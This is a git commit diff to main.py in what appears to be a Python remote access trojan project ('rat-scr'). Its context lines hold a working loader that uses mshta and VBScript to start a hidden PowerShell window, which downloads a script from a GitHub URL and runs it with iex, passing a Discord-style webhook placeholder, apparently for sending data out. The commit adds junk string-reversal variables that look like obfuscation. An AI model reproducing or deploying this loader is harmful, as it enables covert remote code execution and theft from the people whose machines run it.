0f50e5b754685ba4f3ac2c6363be256521d8e76e
43a1723 <hai1723notgay@gmail.com>
2024-08-19 19:15:41 +0700

    Update main.py

--- rat-scr/main.py
+++ rat-scr/main.py
@@ -7,4 +7,6 @@ pythonrat = "you_webhook"
 command = f'mshta.exe vbscript:createobject("wscript.shell").run("powershell $webhook=\'{reverse_string(pythonrat)}\';iwr(\'https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/main.ps1\')|iex",0)(window.close)'
 os.system(command)
 aaaasdasd = reverse_string("you_webhook") + pythonrat + "you_webhook"
-print(aaaasdasd)
+# h
+_A = "you_webhook" + reverse_string("dual")
+_I = reverse_string(_A) + _A + reverse_string("you_webhook") + "dual"
